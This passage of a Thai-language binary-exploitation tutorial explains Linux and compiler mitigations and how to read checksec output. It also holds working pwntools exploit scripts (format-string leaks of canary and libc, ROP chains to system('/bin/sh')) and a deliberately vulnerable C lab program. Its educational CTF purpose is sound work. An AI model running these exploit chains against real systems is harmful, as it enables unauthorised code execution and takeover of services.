### 11.2 SMAP (Supervisor Mode Access Prevention)

```
SMAP ป้องกัน:
- Kernel ไม่สามารถ read/write user-space pages (โดยไม่ตั้งใจ)
- ป้องกัน kernel bugs ที่ access user data โดยตรง
- Intel: CR4.SMAP bit (bit 21)

Exceptions:
- CLAC/STAC instructions ปิด/เปิด SMAP ชั่วคราว
- Access ระหว่าง interrupt/exception handling
```

### 11.3 การตรวจสอบ

```bash
# ดู SMAP/SMEP support:
cat /proc/cpuinfo | grep -E "smep|smap"
# flags: ... smep smap ...

dmesg | grep -E "SMEP|SMAP"
# Kernel self-check output

# ดู CR4 value (ต้องเป็น root):
# bit 20 = SMEP, bit 21 = SMAP
cat /sys/kernel/security/lockdown
```

### 11.4 Bypass SMEP

```
วิธี Bypass:
1. เปลี่ยน CR4 เพื่อปิด SMEP (ต้องมี kernel code execution ก่อน)
   → แต่ SMEP_SUPERVISOR_MODE_ACCESS_PREVENTION ป้องกันได้บางส่วน

2. Stack pivot ไปยัง kernel memory เท่านั้น
   → ใช้ kernel ROP แทน

3. ret2usr bypass:
   - หา kernel gadgets ที่เปิด SMAP/SMEP
   - native_write_cr4() หรือ update_protected_page()
```

---

## ส่วนที่ 12: KPTI (Kernel Page-Table Isolation)

### 12.1 Meltdown และ KPTI

Meltdown (CVE-2017-5754) เป็น hardware vulnerability:
- CPU execute instructions speculatively
- ก่อนที่ permission check จะเสร็จ, data ถูก load เข้า cache
- Attacker อ่าน cache side-channel → leak kernel memory!

KPTI เป็น software mitigation:

```
ก่อน KPTI:
- Page table รวม kernel + user mappings
- Kernel addresses map อยู่เสมอ (ใน user mode ด้วย)
- Meltdown อ่าน kernel memory ผ่าน speculative execution

หลัง KPTI:
- User mode: page table มีเฉพาะ user mappings + minimal kernel stubs
- Kernel mode: page table ครบทั้ง user + kernel
- เมื่อ syscall: swap page tables → overhead!
```

### 12.2 Performance Impact

```bash
# KPTI มี overhead:
# - Syscall-heavy workloads: 5-30% slower
# - I/O bound: ผลน้อย
# - CPU-bound: ผลน้อย

# ดู KPTI status:
dmesg | grep -i kpti
# Kernel/User page tables isolation: enabled

# ปิด KPTI (ไม่แนะนำ):
# kernel parameter: nopti
cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

### 12.3 Kernel Security Overview

```
Timeline ของ Kernel Mitigations:
2004: exec-shield
2005: ASLR ใน kernel
2011: SMEP
2014: SMAP  
2018: KPTI (Meltdown fix)
2018: Retpoline (Spectre fix)
2020: CET/IBT support
```

---

## ส่วนที่ 13: checksec - การใช้งานและตีความ

### 13.1 checksec คืออะไร

`checksec` เป็น script ที่ตรวจสอบ security features ของ binary:

```bash
# ติดตั้ง:
sudo apt install checksec

# หรือ:
pip install checksec.py

# ใน pwntools:
from pwn import *
elf = ELF('./program')
elf.checksec()
```

### 13.2 ตัวอย่าง Output และการตีความ

```
checksec --file=program

RELRO           STACK CANARY      NX            PIE             RPATH     RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH  No RUNPATH   ./program
```

ตีความแต่ละ field:

```
RELRO:
  No RELRO       → GOT writable, .dynamic writable
  Partial RELRO  → .dynamic read-only, .got.plt writable ← GOT overwrite possible
  Full RELRO     → ทุกอย่าง read-only ← ปลอดภัยสุด

STACK CANARY:
  No canary found    → ไม่มี canary ← stack overflow ง่าย
  Canary found       → มี canary ← ต้องหา canary value ก่อน

NX:
  NX disabled        → stack/heap executable ← shellcode inject ง่าย
  NX enabled         → ไม่สามารถ execute data ← ต้องใช้ ROP

PIE:
  No PIE             → binary load ที่ fixed address ← ไม่ต้องหา base
  PIE enabled        → base address random ← ต้อง leak exe base

FORTIFY:
  No              → ไม่มี fortify
  Yes             → มี fortify source
```

### 13.3 ตัวอย่าง Binary ที่มีทุก Protection

```bash
checksec --file=hardened_binary

RELRO           STACK CANARY      NX            PIE             FORTIFY
Full RELRO      Canary found      NX enabled    PIE enabled     Yes

# สิ่งที่ต้องทำ:
# 1. หา leak เพื่อ bypass PIE → รู้ exe base
# 2. หา leak เพื่อ bypass ASLR → รู้ libc base
# 3. ใช้ leak canary หรือหา memory corruption ที่ไม่ overflow canary
# 4. Full RELRO → ไม่ใช้ GOT overwrite
# 5. NX → ใช้ ROP chain
```

### 13.4 Binary ที่ไม่มี Protection (CTF warm-up)

```bash
checksec --file=easy_binary

RELRO           STACK CANARY      NX            PIE             FORTIFY
No RELRO        No canary found   NX disabled   No PIE          No

# ง่ายมาก:
# 1. Overflow buffer
# 2. Inject shellcode ลงใน buffer
# 3. Overwrite return address ชี้ไปที่ shellcode
# 4. บิน!
```

### 13.5 checksec Output ใน pwntools

```python
from pwn import *

elf = ELF('./program')
# Output อัตโนมัติ:
# [*] './program'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

# ใช้ properties:
if elf.canary:
    print("Has canary")
if elf.nx:
    print("NX enabled")
if elf.pie:
    print("PIE enabled")
    
# หา symbols:
print(hex(elf.symbols['main']))
print(hex(elf.got['printf']))
print(hex(elf.plt['printf']))
```

---

## ส่วนที่ 14: การวิเคราะห์ Binary ด้วย Tools

### 14.1 readelf

```bash
# ดู ELF headers:
readelf -h program

# ดู program headers (segments):
readelf -l program

# ดู section headers:
readelf -S program

# ดู dynamic section:
readelf -d program

# ดู relocations:
readelf -r program    # static
readelf -R program    # dynamic

# ดู notes (สำคัญสำหรับ GNU properties เช่น CET):
readelf -n program
```

### 14.2 objdump

```bash
# Disassemble:
objdump -d program         # disassemble code sections
objdump -D program         # disassemble all sections
objdump -M intel -d program  # Intel syntax

# ดู GOT/PLT:
objdump -R program         # dynamic relocations

# ดู sections:
objdump -h program

# ดู symbols:
objdump -t program         # symbol table
objdump -T program         # dynamic symbol table
```

### 14.3 GDB + pwndbg/peda/gef

```bash
# ติดตั้ง pwndbg:
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ใช้งาน:
gdb ./program
(pwndbg) checksec     # ดู security features
(pwndbg) vmmap        # ดู memory map พร้อม permissions
(pwndbg) canary       # ดู canary value
(pwndbg) got          # ดู GOT entries
(pwndbg) plt          # ดู PLT entries
(pwndbg) info func    # list functions
```

### 14.4 pwntools

```python
from pwn import *

# ELF analysis:
elf = ELF('./program')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา gadgets:
rop = ROP(elf)
rop.find_gadget(['pop rdi', 'ret'])

# หา strings:
next(elf.search(b'/bin/sh'))

# Process/Remote:
p = process('./program')
# p = remote('challenge.ctf.com', 1337)

# Leak addresses:
p.recvuntil(b'Address: ')
leak = int(p.recvline(), 16)
```

---

## ส่วนที่ 15: Exploit Development Workflow ใน CTF

### 15.1 Initial Analysis

```bash
# 1. ดู file type:
file program

# 2. ดู security features:
checksec --file=program

# 3. ดู strings ที่น่าสนใจ:
strings program | grep -E "flag|CTF|win|shell"

# 4. ดู functions:
nm -D program
objdump -t program | grep -v " a "

# 5. Disassemble main:
objdump -M intel -d program | grep -A 50 "<main>"
```

### 15.2 กำหนด Strategy

```
ตาม checksec output:

No PIE + No ASLR + No NX + No Canary:
→ Stack overflow + shellcode (classic ret2shellcode)

No PIE + ASLR + NX + No Canary:
→ Stack overflow + ret2libc/ROP
→ ต้อง leak libc base (via puts leak หรือ format string)

PIE + ASLR + NX + Canary:
→ ต้องทำทีละขั้น:
   1. Leak exe base (bypass PIE)
   2. Leak libc base (bypass ASLR)  
   3. Leak canary (bypass SSP)
   4. ROP chain ด้วย known addresses
```

### 15.3 Template Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

# Setup
context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./program')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc.so.6')  # ถ้ามีไฟล์ให้

def start():
    if args.REMOTE:
        return remote('challenge.ctf.com', 1337)
    else:
        return process('./program')

p = start()

# ========== Phase 1: Leak canary ==========
# (ถ้ามี canary)

# ========== Phase 2: Leak exe base ==========
# (ถ้ามี PIE)

# ========== Phase 3: Leak libc base ==========
# (ถ้ามี ASLR)

# ========== Phase 4: Build exploit ==========

# Offsets
OFFSET = 72  # จนถึง return address

# Gadgets
pop_rdi = elf.address + 0x1234  # หลัง leak exe base

# Payload
payload = flat(
    b'A' * OFFSET,
    # canary (ถ้ามี),
    # saved rbp,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.symbols['system'],
)

p.sendline(payload)
p.interactive()
```

---

## ส่วนที่ 16: ตัวอย่าง Real-World Scenarios

### 16.1 Format String + Buffer Overflow

```c
// Vulnerable program:
void vuln() {
    char buf[64];
    printf("Enter name: ");
    read(0, buf, 200);  // overflow
    printf(buf);        // format string
    printf("Enter command: ");
    read(0, buf, 200);  // second overflow
}
```

```python
# Exploit:
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./vuln')
p.recvuntil(b'Enter name: ')

# ========== Phase 1: Leak canary + libc + exe ==========
# Format string ที่ดี: leak หลายค่าพร้อมกัน
# %N$p: leak ค่าที่ N บน stack

fmt = b'%11$p.%13$p.%15$p'  # canary, libc, exe (offset ต้องหาเอง)
p.sendline(fmt)

output = p.recvline()
values = output.split(b'.')

canary = int(values[0], 16)
libc_leak = int(values[1], 16)
exe_leak = int(values[2], 16)

log.info(f"Canary: {hex(canary)}")

libc_base = libc_leak - 0x21b97  # offset ต้องหาจาก libc version
exe_base = exe_leak - 0x1234     # offset ใน binary

log.info(f"libc base: {hex(libc_base)}")
log.info(f"exe base: {hex(exe_base)}")

# ========== Phase 2: Build ROP chain ==========
libc.address = libc_base

pop_rdi = exe_base + 0x1401   # หา gadget จาก binary
ret_gadget = exe_base + 0x1016  # ret; ใช้ align stack

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

p.recvuntil(b'Enter command: ')

payload  = b'A' * 72       # padding to canary
payload += p64(canary)     # canary
payload += p64(0)          # saved RBP
payload += p64(ret_gadget) # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

### 16.2 Heap Exploitation กับ ASLR

```python
# Heap exploit: ต้อง leak heap address ก่อน
# จากนั้น overwrite function pointer

# ขั้นตอนทั่วไป:
# 1. Trigger heap leak (dangling pointer, UAF, etc.)
# 2. หา heap base
# 3. Spray heap เพื่อ control layout
# 4. Overwrite target (function pointer, vtable, etc.)
```

---

## ส่วนที่ 17: การรวม Defenses และ Attacker Perspective

### 17.1 Defense Combinations ที่พบบ่อย

```
Level 1 (CTF beginner):
- No protections → classic shellcode

Level 2 (CTF intermediate):
- NX only → ROP chain, ret2libc

Level 3 (CTF advanced):
- NX + ASLR → leak + ROP

Level 4 (CTF expert):
- NX + ASLR + PIE + Canary → multi-stage leak + ROP

Level 5 (Real-world server):
- NX + ASLR + PIE + Canary + Full RELRO + CFI + seccomp
```

### 17.2 Attacker Mindset

```
เมื่อเห็น binary ใหม่:

Q1: มี memory corruption bug ไหม?
  - Buffer overflow (stack/heap)
  - Use-after-free
  - Double free
  - Integer overflow
  - Format string

Q2: ถ้า overflow: มี canary? ต้อง leak ก่อนไหม?

Q3: NX enabled? ต้องใช้ ROP ไม่ใช่ shellcode?

Q4: ASLR/PIE enabled? มี info leak ไหม?

Q5: GOT overwrite possible? (partial RELRO?)

Q6: มี seccomp? ต้องหา syscall ที่ใช้ได้?
```

### 17.3 สรุป Bypass Techniques

```
Protection    → Bypass Strategy
──────────────────────────────────────────────────
Stack Canary  → Info leak (format string, read OOB)
              → Brute force (32-bit fork server)
              
NX            → ROP chain
              → ret2libc
              → ret2plt
              
ASLR          → Info leak + calculate base
              → Brute force (32-bit)
              → Heap spray (unreliable)
              
PIE           → Info leak ของ exe addresses
              → Use relative addresses
              
Full RELRO    → ไม่ใช้ GOT overwrite
              → Target .data, heap, stack แทน
              
Fortify       → ใช้ vulnerabilities ที่ไม่ใช่ string functions
              
seccomp       → หา uncovered syscalls
              → 32-bit syscall trick
              
CFI           → ต้องหา memory corruption ที่ไม่ใช่ function ptr
              → Type confusion ที่ผ่าน CFI check
```

---

## ส่วนที่ 18: Practical Labs

### Lab 1: ตรวจสอบ Binary

```bash
# สร้าง binary ทดสอบ:
cat > test.c << 'EOF'
#include <stdio.h>
#include <string.h>

void win() {
    puts("You win!");
}

void vuln() {
    char buf[64];
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
EOF

# Compile versions ต่างๆ:
gcc -o test_no_prot -fno-stack-protector -z execstack -no-pie test.c
gcc -o test_canary -fstack-protector test.c
gcc -o test_nx -fno-stack-protector test.c
gcc -o test_full -fstack-protector-strong -pie -fpie -Wl,-z,relro,-z,now test.c

# ตรวจสอบแต่ละ binary:
for b in test_no_prot test_canary test_nx test_full; do
    echo "=== $b ==="
    checksec --file=$b
done
```

### Lab 2: Stack Canary Bypass

```python
#!/usr/bin/env python3
# Lab: Bypass stack canary ด้วย format string leak

from pwn import *

# binary: ต้องมี format string vulnerability + stack overflow
# compile: gcc -fstack-protector lab2.c -o lab2

p = process('./lab2')

# Step 1: หา canary offset ด้วย brute force format string
for i in range(1, 30):
    p2 = process('./lab2')
    p2.sendline(f'%{i}$p'.encode())
    result = p2.recvline()
    # canary มักขึ้นต้นด้วย 0x00xxxxxxxx ใน 64-bit
    if b'0x00' in result:
        print(f"Canary likely at offset {i}: {result.decode().strip()}")
    p2.close()
```

### Lab 3: ROP Chain

```python
#!/usr/bin/env python3
# Lab: ROP chain เพื่อ bypass NX

from pwn import *

# binary ที่มี NX แต่ไม่มี ASLR (ง่ายสุด)
elf = ELF('./lab3')

# หา gadgets:
rop = ROP(elf)

# Manual approach:
# ROPgadget --binary lab3 | grep "pop rdi"
pop_rdi = 0x401234   # จาก ROPgadget output

# หา /bin/sh ใน binary หรือ libc:
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']  # ถ้ามีใน PLT

payload = flat(
    b'A' * 72,       # offset to return address
    pop_rdi,
    bin_sh,
    system,
)

p = process('./lab3')
p.sendline(payload)
p.interactive()
```

### Lab 4: Full Chain (PIE + ASLR + Canary + NX)

```python
#!/usr/bin/env python3
# Lab: Full exploit chain

from pwn import *

elf = ELF('./lab4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./lab4')

# ======== Stage 1: Leak everything ========
# สมมติมี format string vulnerability

# Leak canary (byte แรกเป็น \x00 เสมอ)
# หา offset บน stack: ส่ง %1$p %2$p ... จนเจอ 0x00xxxxxxxx

# Leak exe address (ชี้ไปใน binary)
# Leak libc address (ชี้ไปใน libc)

# ตัวอย่าง (offset สมมติ):
fmt = b'%11$p.%23$p.%31$p\n'  
p.sendline(fmt)

output = p.recvline()
parts = output.strip().split(b'.')

canary = int(parts[0], 16)
exe_leak = int(parts[1], 16)
libc_leak = int(parts[2], 16)

# คำนวณ bases:
exe_base = exe_leak - elf.symbols['main']   # ปรับ offset
libc_base = libc_leak - 0x21ab0             # ปรับ offset ตาม libc version

elf.address = exe_base
libc.address = libc_base

log.success(f"Canary: {hex(canary)}")
log.success(f"exe base: {hex(exe_base)}")
log.success(f"libc base: {hex(libc_base)}")

# ======== Stage 2: Build exploit ========

# หา gadgets ใน binary (หลัง PIE base ถูก set แล้ว):
pop_rdi = exe_base + 0x1401  # จาก ROPgadget

# Stack alignment gadget:
ret = exe_base + 0x1016  # ret;

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

# Overflow:
p.recvuntil(b'> ')  # ปรับตาม program

payload = flat(
    b'A' * 64,      # padding
    canary,         # canary
    b'B' * 8,       # saved RBP
    ret,            # stack alignment
    pop_rdi,
    bin_sh,
    system,
)

p.sendline(payload)
p.interactive()
```

---

## ส่วนที่ 19: Modern Mitigations สรุป

### 19.1 ตาราง Comparison

```
Mitigation      | Layer      | Bypassed by           | Cost
─────────────────────────────────────────────────────────────
Stack Canary    | Software   | Info leak, brute(32)  | Low
NX/DEP          | Hardware   | ROP chains            | Near zero
ASLR            | OS         | Info leak, brute(32)  | Low
PIE             | Compiler   | Info leak             | Very low
Partial RELRO   | Linker     | Still writable GOT    | None
Full RELRO      | Linker     | Other write targets   | Startup time
Fortify Source  | Compiler   | Non-string vulns      | Very low
Safe Stack      | Compiler   | Heap overflow         | Low-Medium
Shadow Stack    | Hardware   | Heap + complex        | Very low
CFI             | Compiler   | Type confusion        | Low-Medium
seccomp         | Kernel     | Uncovered syscalls    | Per-call check
SMAP/SMEP       | Hardware   | Kernel ROP            | Negligible
KPTI            | Kernel     | (Meltdown mitigation) | 5-30%
```

### 19.2 ความสำคัญของ Defense in Depth

```
หลักการ: ไม่มี mitigation เดียวที่ perfect

Stack Canary ถูก bypass ด้วย info leak
→ ASLR ทำให้ info leak หา target ได้ยากขึ้น
→ CFI ทำให้ ROP ยากขึ้น
→ seccomp จำกัดสิ่งที่ทำได้หลัง exploit
→ Sandboxing จำกัด damage ถ้า exploit สำเร็จ

หลายชั้น → attacker ต้องหาช่องโหว่หลายช่องพร้อมกัน
```

---

## ส่วนที่ 20: CTF-Specific Tips

### 20.1 Quick Identification

```bash
# Script สำหรับ analyze CTF binary อย่างรวดเร็ว:
#!/bin/bash
BINARY=$1

echo "=== File Info ==="
file $BINARY

echo "=== Security ==="
checksec --file=$BINARY 2>/dev/null || python3 -c "
import subprocess
r = subprocess.run(['checksec', '--file=$BINARY'], capture_output=True, text=True)
print(r.stdout)
"

echo "=== Interesting Strings ==="
strings $BINARY | grep -E "flag|CTF|win|shell|/bin|pass|secret" | head -20

echo "=== Functions ==="
nm -D $BINARY 2>/dev/null | grep -v "^$" | head -30

echo "=== PLT/GOT ==="
objdump -R $BINARY 2>/dev/null | head -20
```

### 20.2 One-liner Helpers

```bash
# หา offset ถึง return address ด้วย cyclic pattern:
python3 -c "from pwn import *; print(cyclic(200))" | ./program
# จาก crash address: python3 -c "from pwn import *; print(cyclic_find(0x61616172))"

# หา ROP gadgets:
ROPgadget --binary ./program --rop | head -50

# หา "/bin/sh" ใน libc:
strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

# ดู libc version:
ldd ./program
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"

# หา one_gadget (execve ที่เรียกได้ง่าย):
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

### 20.3 GDB Cheatsheet

```gdb
# ใน GDB กับ pwndbg:

# ดู stack:
stack 20

# ดู registers:
regs

# ดู canary:
canary

# Set breakpoint:
b *0x401234
b main
b *main+0x40

# Run with args:
run < <(python3 exploit.py)

# Examine memory:
x/20gx $rsp   # 20 quad-words from rsp
x/s 0x601060  # string at address
x/i $rip      # instruction at rip

# Find pattern offset:
pattern create 200
pattern search $rsp  # หลัง crash
```

---

## สรุป (Summary)

### Key Takeaways

1. **Stack Canary**: ป้องกัน stack overflow แบบง่าย แต่ถูก bypass ด้วย information leak

2. **NX/DEP/W^X**: ป้องกัน shellcode injection บน stack/heap แต่ ROP chains ยังใช้งานได้

3. **ASLR**: randomize addresses ทำให้ exploit ยากขึ้นมาก แต่ 32-bit ยังถูก brute force ได้

4. **PIE**: รวมกับ ASLR เพื่อ randomize executable base ด้วย ต้องมี info leak เพิ่มเติม

5. **RELRO**: Full RELRO ป้องกัน GOT overwrite ซึ่งเป็น attack primitive ที่นิยมใน CTF

6. **Fortify Source**: ป้องกัน common string bugs ระดับ compile/runtime

7. **Safe Stack + Shadow Stack**: ป้องกัน return address tampering ในระดับ compiler/hardware

8. **CFI**: ป้องกัน indirect control flow hijacking แต่ต้องการ LTO

9. **seccomp**: จำกัด syscalls ที่ใช้ได้หลัง exploit ช่วย contain damage

10. **SMAP/SMEP/KPTI**: Kernel-level protections ป้องกัน kernel exploits

11. **checksec**: เครื่องมือสำคัญที่ต้องรู้วิธีตีความ output

### Defense in Depth Philosophy

```
Single layer:  ถูก bypass ด้วย technique เดียว
Multiple layers: ต้องหา chain ของ vulnerabilities → ยากมากขึ้น

Real-world secure system:
PIE + ASLR + Canary + NX + Full RELRO + CFI + seccomp + Sandbox
→ แต่ละชั้นช่วยลด attack surface
→ Attacker ต้องหา exploit chain ที่ยาวและซับซ้อน
```

---

## อ้างอิง (References)

- [Intel CET Technology Preview](https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html)
- [LLVM Control Flow Integrity](https://clang.llvm.org/docs/ControlFlowIntegrity.html)
- [Linux Kernel Security](https://www.kernel.org/doc/html/latest/security/index.html)
- [pwntools Documentation](https://docs.pwntools.com/)
- [CTF Wiki - Binary Exploitation](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/)
- [GCC Stack Protection](https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)
- [seccomp Documentation](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [checksec.sh](https://github.com/slimm609/checksec.sh)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [one_gadget](https://github.com/david942j/one_gadget)

---

*Part 077 จบแล้ว - ต่อไป Part 078: Advanced ROP Techniques*
